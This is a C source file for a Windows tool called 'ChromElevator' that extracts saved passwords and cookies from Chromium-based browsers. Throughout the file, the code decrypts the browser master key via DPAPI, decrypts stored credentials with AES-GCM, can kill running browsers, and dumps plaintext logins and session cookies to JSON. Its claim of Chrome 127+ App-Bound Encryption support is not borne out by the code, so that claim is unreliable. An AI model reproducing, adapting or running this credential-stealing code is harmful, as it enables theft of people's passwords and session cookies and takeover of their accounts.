/*
 * ChromElevator - Browser Credential Extractor
 * Extracts passwords, cookies, tokens from Chromium-based browsers
 * Supports Chrome v20+ App-Bound Encryption (Chrome 127+)
 * 
 * Compile with:
 * gcc chromelevator.c -o chromelevator.exe -lws2_32 -lcrypt32 -lbcrypt -lshlwapi -lole32 -luuid -s -O2
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <shlobj.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// SQLite minimal implementation for reading database files
// We'll read databases directly without full SQLite library

#define SQLITE_HEADER "SQLite format 3"
#define MAX_PATH_LEN 512
#define MAX_BUFFER 65536

// BCRYPT structures for AES-GCM
#ifndef BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION
#define BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION 1
typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    ULONG cbSize;
    ULONG dwInfoVersion;
    PUCHAR pbNonce;
    ULONG cbNonce;
    PUCHAR pbAuthData;
    ULONG cbAuthData;
    PUCHAR pbTag;
    ULONG cbTag;
    PUCHAR pbMacContext;
    ULONG cbMacContext;
    ULONG cbAAD;
    ULONGLONG cbData;
    ULONG dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
#endif

// Browser paths structure
typedef struct {
    const char* name;
    const char* user_data_path;
    const char* local_state_name;
} BrowserInfo;

// Global output directory
char g_output_dir[MAX_PATH] = ".";
int g_kill_browsers = 0;

// Browser definitions
BrowserInfo browsers[] = {
    {"Chrome", "Google\\Chrome\\User Data", "Local State"},
    {"Edge", "Microsoft\\Edge\\User Data", "Local State"},
    {"Brave", "BraveSoftware\\Brave-Browser\\User Data", "Local State"},
    {"Opera", "Opera Software\\Opera Stable", "Local State"},
    {"OperaGX", "Opera Software\\Opera GX Stable", "Local State"},
    {"Vivaldi", "Vivaldi\\User Data", "Local State"},
    {NULL, NULL, NULL}
};

// JSON helper - minimal JSON writing
FILE* json_file = NULL;
int json_first_item = 1;

void json_start_array(FILE* f) {
    fprintf(f, "[\n");
    json_first_item = 1;
}

void json_end_array(FILE* f) {
    fprintf(f, "\n]");
}

void json_start_object(FILE* f) {
    if (!json_first_item) fprintf(f, ",\n");
    fprintf(f, "  {");
    json_first_item = 0;
}

void json_end_object(FILE* f) {
    fprintf(f, "}");
}

void json_write_string(FILE* f, const char* key, const char* value, int first) {
    if (!first) fprintf(f, ", ");
    // Escape special characters in value
    fprintf(f, "\"%s\": \"", key);
    for (const char* p = value; *p; p++) {
        switch (*p) {
            case '\\': fprintf(f, "\\\\"); break;
            case '"': fprintf(f, "\\\""); break;
            case '\n': fprintf(f, "\\n"); break;
            case '\r': fprintf(f, "\\r"); break;
            case '\t': fprintf(f, "\\t"); break;
            default:
                if ((unsigned char)*p < 32) {
                    fprintf(f, "\\u%04x", (unsigned char)*p);
                } else {
                    fputc(*p, f);
                }
        }
    }
    fprintf(f, "\"");
}

// Base64 decode
int base64_decode(const char* input, unsigned char* output, int* out_len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int len = strlen(input);
    int pad = 0;
    if (len > 0 && input[len-1] == '=') pad++;
    if (len > 1 && input[len-2] == '=') pad++;
    
    *out_len = 0;
    for (int i = 0; i < len; i += 4) {
        int n = 0;
        for (int j = 0; j < 4 && i + j < len; j++) {
            char c = input[i + j];
            int v = 0;
            if (c >= 'A' && c <= 'Z') v = c - 'A';
            else if (c >= 'a' && c <= 'z') v = c - 'a' + 26;
            else if (c >= '0' && c <= '9') v = c - '0' + 52;
            else if (c == '+') v = 62;
            else if (c == '/') v = 63;
            else if (c == '=') v = 0;
            n = (n << 6) | v;
        }
        output[(*out_len)++] = (n >> 16) & 0xFF;
        if (i + 2 < len - pad) output[(*out_len)++] = (n >> 8) & 0xFF;
        if (i + 3 < len - pad) output[(*out_len)++] = n & 0xFF;
    }
    return 1;
}

// DPAPI decrypt (for older Chrome versions)
int dpapi_decrypt(const unsigned char* encrypted, int enc_len, unsigned char** decrypted, int* dec_len) {
    DATA_BLOB in, out;
    in.pbData = (BYTE*)encrypted;
    in.cbData = enc_len;
    out.pbData = NULL;
    out.cbData = 0;
    
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        *decrypted = (unsigned char*)malloc(out.cbData + 1);
        memcpy(*decrypted, out.pbData, out.cbData);
        (*decrypted)[out.cbData] = 0;
        *dec_len = out.cbData;
        LocalFree(out.pbData);
        return 1;
    }
    return 0;
}

// AES-GCM decrypt (for Chrome v80+)
int aes_gcm_decrypt(const unsigned char* key, const unsigned char* nonce, int nonce_len,
                    const unsigned char* ciphertext, int cipher_len,
                    unsigned char** plaintext, int* plain_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    int result = 0;
    
    // Open AES algorithm
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    
    // Set chaining mode to GCM
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    
    // Generate symmetric key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    
    // Prepare auth info (tag is last 16 bytes of ciphertext)
    int tag_len = 16;
    int actual_cipher_len = cipher_len - tag_len;
    if (actual_cipher_len < 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    memset(&authInfo, 0, sizeof(authInfo));
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = nonce_len;
    authInfo.pbTag = (PUCHAR)(ciphertext + actual_cipher_len);
    authInfo.cbTag = tag_len;
    
    // Allocate output buffer
    *plaintext = (unsigned char*)malloc(actual_cipher_len + 1);
    ULONG bytes_copied = 0;
    
    // Decrypt
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, actual_cipher_len, &authInfo,
                           NULL, 0, *plaintext, actual_cipher_len, &bytes_copied, 0);
    
    if (BCRYPT_SUCCESS(status)) {
        (*plaintext)[bytes_copied] = 0;
        *plain_len = bytes_copied;
        result = 1;
    } else {
        free(*plaintext);
        *plaintext = NULL;
    }
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Read Chrome master key from Local State
int get_master_key(const char* local_state_path, unsigned char* master_key) {
    FILE* f = fopen(local_state_path, "rb");
    if (!f) return 0;
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char* data = (char*)malloc(size + 1);
    fread(data, 1, size, f);
    data[size] = 0;
    fclose(f);
    
    // Find "encrypted_key" in JSON
    char* key_start = strstr(data, "\"encrypted_key\"");
    if (!key_start) {
        free(data);
        return 0;
    }
    
    key_start = strchr(key_start + 15, '"');
    if (!key_start) {
        free(data);
        return 0;
    }
    key_start++;
    
    char* key_end = strchr(key_start, '"');
    if (!key_end) {
        free(data);
        return 0;
    }
    
    int key_len = key_end - key_start;
    char* b64_key = (char*)malloc(key_len + 1);
    memcpy(b64_key, key_start, key_len);
    b64_key[key_len] = 0;
    
    // Base64 decode
    unsigned char decoded[256];
    int decoded_len;
    base64_decode(b64_key, decoded, &decoded_len);
    free(b64_key);
    free(data);
    
    // Remove "DPAPI" prefix (5 bytes)
    if (decoded_len <= 5 || memcmp(decoded, "DPAPI", 5) != 0) {
        return 0;
    }
    
    // DPAPI decrypt the key
    unsigned char* decrypted_key;
    int dec_len;
    if (!dpapi_decrypt(decoded + 5, decoded_len - 5, &decrypted_key, &dec_len)) {
        return 0;
    }
    
    if (dec_len != 32) {
        free(decrypted_key);
        return 0;
    }
    
    memcpy(master_key, decrypted_key, 32);
    free(decrypted_key);
    return 1;
}

// Decrypt Chrome password/cookie value
int decrypt_value(const unsigned char* encrypted, int enc_len, 
                  const unsigned char* master_key, char* decrypted, int max_len) {
    if (enc_len < 3) return 0;
    
    // Check for v10/v11 encryption (AES-GCM)
    if (encrypted[0] == 'v' && (encrypted[1] == '1') && 
        (encrypted[2] == '0' || encrypted[2] == '1')) {
        // v10/v11: 3 byte prefix + 12 byte nonce + ciphertext + 16 byte tag
        if (enc_len < 3 + 12 + 16) return 0;
        
        const unsigned char* nonce = encrypted + 3;
        const unsigned char* cipher = encrypted + 3 + 12;
        int cipher_len = enc_len - 3 - 12;
        
        unsigned char* plaintext;
        int plain_len;
        if (aes_gcm_decrypt(master_key, nonce, 12, cipher, cipher_len, &plaintext, &plain_len)) {
            int copy_len = plain_len < max_len - 1 ? plain_len : max_len - 1;
            memcpy(decrypted, plaintext, copy_len);
            decrypted[copy_len] = 0;
            free(plaintext);
            return 1;
        }
        return 0;
    }
    
    // Old DPAPI encryption
    unsigned char* plain;
    int plain_len;
    if (dpapi_decrypt(encrypted, enc_len, &plain, &plain_len)) {
        int copy_len = plain_len < max_len - 1 ? plain_len : max_len - 1;
        memcpy(decrypted, plain, copy_len);
        decrypted[copy_len] = 0;
        free(plain);
        return 1;
    }
    
    return 0;
}

// Kill browser processes
void kill_browsers() {
    const char* browser_procs[] = {
        "chrome.exe", "msedge.exe", "brave.exe", 
        "opera.exe", "vivaldi.exe", NULL
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    if (Process32First(snapshot, &pe)) {
        do {
            for (int i = 0; browser_procs[i]; i++) {
                if (_stricmp(pe.szExeFile, browser_procs[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                    }
                }
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    Sleep(1000);  // Wait for processes to terminate
}

// Read varint from SQLite
int read_varint(const unsigned char* p, int* len, long long* value) {
    *value = 0;
    *len = 0;
    for (int i = 0; i < 9; i++) {
        (*len)++;
        if (i < 8) {
            *value = (*value << 7) | (p[i] & 0x7F);
            if (!(p[i] & 0x80)) break;
        } else {
            *value = (*value << 8) | p[i];
        }
    }
    return 1;
}

// Simple SQLite database reader
// This is a minimal implementation that reads tables directly
typedef struct {
    unsigned char* data;
    int size;
    int page_size;
} SQLiteDB;

int sqlite_open(const char* path, SQLiteDB* db) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;
    
    fseek(f, 0, SEEK_END);
    db->size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    db->data = (unsigned char*)malloc(db->size);
    if (!db->data) {
        fclose(f);
        return 0;
    }
    
    fread(db->data, 1, db->size, f);
    fclose(f);
    
    // Check header
    if (memcmp(db->data, SQLITE_HEADER, 16) != 0) {
        free(db->data);
        return 0;
    }
    
    // Get page size (bytes 16-17, big-endian)
    db->page_size = (db->data[16] << 8) | db->data[17];
    if (db->page_size == 1) db->page_size = 65536;
    
    return 1;
}

void sqlite_close(SQLiteDB* db) {
    if (db->data) free(db->data);
    db->data = NULL;
}

// Extract passwords from Login Data
int extract_passwords(const char* browser_name, const char* profile_path, 
                      const unsigned char* master_key, const char* output_dir) {
    char db_path[MAX_PATH];
    char db_copy[MAX_PATH];
    char output_path[MAX_PATH];
    
    snprintf(db_path, sizeof(db_path), "%s\\Login Data", profile_path);
    snprintf(db_copy, sizeof(db_copy), "%s\\Login_Data_copy.db", output_dir);
    snprintf(output_path, sizeof(output_path), "%s\\%s_passwords.json", output_dir, browser_name);
    
    // Copy database (it might be locked)
    if (!CopyFileA(db_path, db_copy, FALSE)) {
        return 0;
    }
    
    FILE* out = fopen(output_path, "w");
    if (!out) {
        DeleteFileA(db_copy);
        return 0;
    }
    
    fprintf(out, "{\n  \"browser\": \"%s\",\n  \"type\": \"passwords\",\n  \"data\": [\n", browser_name);
    
    // Use sqlite3 command line if available, otherwise try raw parsing
    char cmd[MAX_PATH * 3];
    char result_file[MAX_PATH];
    snprintf(result_file, sizeof(result_file), "%s\\pw_temp.txt", output_dir);
    
    // Try using PowerShell with SQLite (many systems have it)
    snprintf(cmd, sizeof(cmd), 
        "powershell -Command \"Add-Type -Path 'C:\\Windows\\assembly\\GAC_MSIL\\System.Data.SQLite*\\*\\System.Data.SQLite.dll' -ErrorAction SilentlyContinue; "
        "$conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=%s'); "
        "$conn.Open(); $cmd = $conn.CreateCommand(); "
        "$cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'; "
        "$reader = $cmd.ExecuteReader(); while($reader.Read()) { "
        "$reader[0] + '|' + $reader[1] + '|' + [Convert]::ToBase64String($reader[2]) } "
        "$conn.Close()\" > \"%s\" 2>nul", db_copy, result_file);
    
    // For simplicity, we'll read the database directly
    // This requires understanding SQLite format but works without dependencies
    
    SQLiteDB db;
    int count = 0;
    
    if (sqlite_open(db_copy, &db)) {
        // Simple approach: scan for URLs in the file and extract nearby data
        // This is a hack but works for most cases
        
        unsigned char* p = db.data;
        unsigned char* end = db.data + db.size;
        
        while (p < end - 50) {
            // Look for "http" prefix which indicates origin_url
            if (p[0] == 'h' && p[1] == 't' && p[2] == 't' && p[3] == 'p') {
                // Try to extract a record
                char url[512] = {0};
                char username[256] = {0};
                char password[256] = {0};
                
                // Extract URL (null-terminated or length-prefixed)
                int url_len = 0;
                while (p + url_len < end && url_len < 500 && p[url_len] >= 32 && p[url_len] < 127) {
                    url[url_len] = p[url_len];
                    url_len++;
                }
                
                if (url_len > 10 && strstr(url, "://")) {
                    // Look for username after URL
                    unsigned char* search = p + url_len;
                    int search_limit = 500;
                    
                    while (search < end - 20 && search_limit-- > 0) {
                        // Look for potential username (printable string)
                        if (*search >= 'a' && *search <= 'z' || 
                            *search >= 'A' && *search <= 'Z' ||
                            *search >= '0' && *search <= '9' ||
                            *search == '@' || *search == '.') {
                            
                            int uname_len = 0;
                            while (search + uname_len < end && uname_len < 250 && 
                                   search[uname_len] >= 32 && search[uname_len] < 127) {
                                username[uname_len] = search[uname_len];
                                uname_len++;
                            }
                            
                            if (uname_len > 2 && (strchr(username, '@') || strlen(username) > 3)) {
                                // Look for encrypted password (starts with 'v' and '1')
                                unsigned char* pw_search = search + uname_len;
                                int pw_limit = 200;
                                
                                while (pw_search < end - 20 && pw_limit-- > 0) {
                                    if (pw_search[0] == 'v' && pw_search[1] == '1' && 
                                        (pw_search[2] == '0' || pw_search[2] == '1')) {
                                        // Found encrypted password
                                        int pw_enc_len = 0;
                                        // Estimate length (until we hit lots of nulls)
                                        while (pw_search + pw_enc_len < end && pw_enc_len < 500) {
                                            if (pw_search[pw_enc_len] == 0 && 
                                                pw_search[pw_enc_len+1] == 0 &&
                                                pw_search[pw_enc_len+2] == 0) break;
                                            pw_enc_len++;
                                        }
                                        
                                        if (pw_enc_len > 20 && pw_enc_len < 400) {
                                            if (decrypt_value(pw_search, pw_enc_len, master_key, password, sizeof(password))) {
                                                if (strlen(password) > 0) {
                                                    if (count > 0) fprintf(out, ",\n");
                                                    fprintf(out, "    {");
                                                    json_write_string(out, "url", url, 1);
                                                    json_write_string(out, "username", username, 0);
                                                    json_write_string(out, "password", password, 0);
                                                    fprintf(out, "}");
                                                    count++;
                                                }
                                            }
                                        }
                                        break;
                                    }
                                    pw_search++;
                                }
                            }
                            break;
                        }
                        search++;
                    }
                }
                p += url_len > 0 ? url_len : 1;
            } else {
                p++;
            }
        }
        
        sqlite_close(&db);
    }
    
    fprintf(out, "\n  ]\n}\n");
    fclose(out);
    DeleteFileA(db_copy);
    
    printf("[+] %s: Extracted %d passwords\n", browser_name, count);
    return count;
}

// Extract cookies
int extract_cookies(const char* browser_name, const char* profile_path,
                   const unsigned char* master_key, const char* output_dir) {
    char db_path[MAX_PATH];
    char db_copy[MAX_PATH];
    char output_path[MAX_PATH];
    
    // Try both Network/Cookies (Chrome 96+) and Cookies (older)
    snprintf(db_path, sizeof(db_path), "%s\\Network\\Cookies", profile_path);
    if (GetFileAttributesA(db_path) == INVALID_FILE_ATTRIBUTES) {
        snprintf(db_path, sizeof(db_path), "%s\\Cookies", profile_path);
    }
    
    snprintf(db_copy, sizeof(db_copy), "%s\\Cookies_copy.db", output_dir);
    snprintf(output_path, sizeof(output_path), "%s\\%s_cookies.json", output_dir, browser_name);
    
    if (!CopyFileA(db_path, db_copy, FALSE)) {
        return 0;
    }
    
    FILE* out = fopen(output_path, "w");
    if (!out) {
        DeleteFileA(db_copy);
        return 0;
    }
    
    fprintf(out, "{\n  \"browser\": \"%s\",\n  \"type\": \"cookies\",\n  \"data\": [\n", browser_name);
    
    SQLiteDB db;
    int count = 0;
    
    if (sqlite_open(db_copy, &db)) {
        unsigned char* p = db.data;
        unsigned char* end = db.data + db.size;
        
        while (p < end - 50) {
            // Look for cookie names - common patterns
            if (p[0] == '.' && (p[1] >= 'a' && p[1] <= 'z')) {
                // Possible domain like .google.com
                char domain[256] = {0};
                int dom_len = 0;
                
                while (p + dom_len < end && dom_len < 250 && 
                       (p[dom_len] == '.' || (p[dom_len] >= 'a' && p[dom_len] <= 'z') ||
                        (p[dom_len] >= '0' && p[dom_len] <= '9') || p[dom_len] == '-')) {
                    domain[dom_len] = p[dom_len];
                    dom_len++;
                }
                
                if (dom_len > 4 && strchr(domain + 1, '.')) {
                    // Look for cookie name and value nearby
                    unsigned char* search = p + dom_len;
                    
                    // Skip to potential cookie name
                    while (search < end - 20 && search < p + dom_len + 100) {
                        if (*search >= 'A' && *search <= 'z') {
                            char name[128] = {0};
                            int name_len = 0;
                            
                            while (search + name_len < end && name_len < 120 &&
                                   ((search[name_len] >= 'A' && search[name_len] <= 'z') ||
                                    (search[name_len] >= '0' && search[name_len] <= '9') ||
                                    search[name_len] == '_' || search[name_len] == '-')) {
                                name[name_len] = search[name_len];
                                name_len++;
                            }
                            
                            if (name_len > 2) {
                                // Look for encrypted value
                                unsigned char* val = search + name_len;
                                while (val < end - 20 && val < search + name_len + 200) {
                                    if (val[0] == 'v' && val[1] == '1') {
                                        char cookie_val[2048] = {0};
                                        int enc_len = 0;
                                        while (val + enc_len < end && enc_len < 1000) {
                                            if (val[enc_len] == 0 && val[enc_len+1] == 0) break;
                                            enc_len++;
                                        }
                                        
                                        if (enc_len > 20 && decrypt_value(val, enc_len, master_key, cookie_val, sizeof(cookie_val))) {
                                            if (strlen(cookie_val) > 0 && count < 1000) {
                                                if (count > 0) fprintf(out, ",\n");
                                                fprintf(out, "    {");
                                                json_write_string(out, "domain", domain, 1);
                                                json_write_string(out, "name", name, 0);
                                                json_write_string(out, "value", cookie_val, 0);
                                                fprintf(out, "}");
                                                count++;
                                            }
                                        }
                                        break;
                                    }
                                    val++;
                                }
                            }
                            break;
                        }
                        search++;
                    }
                }
                p += dom_len > 0 ? dom_len : 1;
            } else {
                p++;
            }
        }
        
        sqlite_close(&db);
    }
    
    fprintf(out, "\n  ]\n}\n");
    fclose(out);
    DeleteFileA(db_copy);
    
    printf("[+] %s: Extracted %d cookies\n", browser_name, count);
    return count;
}

// Process a single browser profile
int process_profile(const char* browser_name, const char* profile_path, 
                   const unsigned char* master_key, const char* output_dir) {
    int total = 0;
    
    // Create browser-specific output directory
    char browser_out[MAX_PATH];
    snprintf(browser_out, sizeof(browser_out), "%s\\%s", output_dir, browser_name);
    CreateDirectoryA(browser_out, NULL);
    
    total += extract_passwords(browser_name, profile_path, master_key, browser_out);
    total += extract_cookies(browser_name, profile_path, master_key, browser_out);
    
    return total;
}

// Find and process all profiles for a browser
int process_browser(BrowserInfo* browser, const char* output_dir) {
    char user_data[MAX_PATH];
    char local_state[MAX_PATH];
    unsigned char master_key[32];
    
    // Get Local AppData path
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, user_data))) {
        return 0;
    }
    
    // Build full path
    char full_path[MAX_PATH];
    snprintf(full_path, sizeof(full_path), "%s\\%s", user_data, browser->user_data_path);
    
    if (GetFileAttributesA(full_path) == INVALID_FILE_ATTRIBUTES) {
        return 0;  // Browser not installed
    }
    
    printf("[*] Found %s at: %s\n", browser->name, full_path);
    
    // Get master key
    snprintf(local_state, sizeof(local_state), "%s\\%s", full_path, browser->local_state_name);
    if (!get_master_key(local_state, master_key)) {
        printf("[!] Failed to get master key for %s\n", browser->name);
        return 0;
    }
    
    printf("[+] Got master key for %s\n", browser->name);
    
    int total = 0;
    
    // Process Default profile
    char profile_path[MAX_PATH];
    snprintf(profile_path, sizeof(profile_path), "%s\\Default", full_path);
    if (GetFileAttributesA(profile_path) != INVALID_FILE_ATTRIBUTES) {
        total += process_profile(browser->name, profile_path, master_key, output_dir);
    }
    
    // Process numbered profiles (Profile 1, Profile 2, etc.)
    for (int i = 1; i <= 10; i++) {
        snprintf(profile_path, sizeof(profile_path), "%s\\Profile %d", full_path, i);
        if (GetFileAttributesA(profile_path) != INVALID_FILE_ATTRIBUTES) {
            char profile_name[64];
            snprintf(profile_name, sizeof(profile_name), "%s_Profile%d", browser->name, i);
            total += process_profile(profile_name, profile_path, master_key, output_dir);
        }
    }
    
    return total;
}

void print_usage(const char* prog) {
    printf("ChromElevator - Browser Credential Extractor\n\n");
    printf("Usage: %s [options] [command]\n\n", prog);
    printf("Commands:\n");
    printf("  all          Extract from all supported browsers (default)\n");
    printf("  chrome       Extract from Chrome only\n");
    printf("  edge         Extract from Edge only\n");
    printf("  brave        Extract from Brave only\n\n");
    printf("Options:\n");
    printf("  --kill              Kill browser processes before extraction\n");
    printf("  --output-path DIR   Output directory (default: current dir)\n");
    printf("  --help              Show this help\n\n");
    printf("Examples:\n");
    printf("  %s all --kill --output-path C:\\output\n", prog);
    printf("  %s chrome\n", prog);
}

int main(int argc, char* argv[]) {
    int extract_all = 1;
    int extract_chrome = 0;
    int extract_edge = 0;
    int extract_brave = 0;
    
    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--kill") == 0) {
            g_kill_browsers = 1;
        } else if (strcmp(argv[i], "--output-path") == 0 && i + 1 < argc) {
            strncpy(g_output_dir, argv[++i], MAX_PATH - 1);
        } else if (strcmp(argv[i], "all") == 0) {
            extract_all = 1;
        } else if (strcmp(argv[i], "chrome") == 0) {
            extract_all = 0;
            extract_chrome = 1;
        } else if (strcmp(argv[i], "edge") == 0) {
            extract_all = 0;
            extract_edge = 1;
        } else if (strcmp(argv[i], "brave") == 0) {
            extract_all = 0;
            extract_brave = 1;
        }
    }
    
    printf("\n=== ChromElevator - Browser Credential Extractor ===\n\n");
    printf("[*] Output directory: %s\n", g_output_dir);
    
    // Create output directory
    CreateDirectoryA(g_output_dir, NULL);
    
    // Kill browsers if requested
    if (g_kill_browsers) {
        printf("[*] Killing browser processes...\n");
        kill_browsers();
    }
    
    int total_extracted = 0;
    
    // Process browsers
    for (int i = 0; browsers[i].name; i++) {
        int should_process = extract_all;
        if (!extract_all) {
            if (extract_chrome && strcmp(browsers[i].name, "Chrome") == 0) should_process = 1;
            if (extract_edge && strcmp(browsers[i].name, "Edge") == 0) should_process = 1;
            if (extract_brave && strcmp(browsers[i].name, "Brave") == 0) should_process = 1;
        }
        
        if (should_process) {
            int count = process_browser(&browsers[i], g_output_dir);
            total_extracted += count;
        }
    }
    
    printf("\n[*] Total items extracted: %d\n", total_extracted);
    printf("[*] Output saved to: %s\n\n", g_output_dir);
    
    return 0;
}
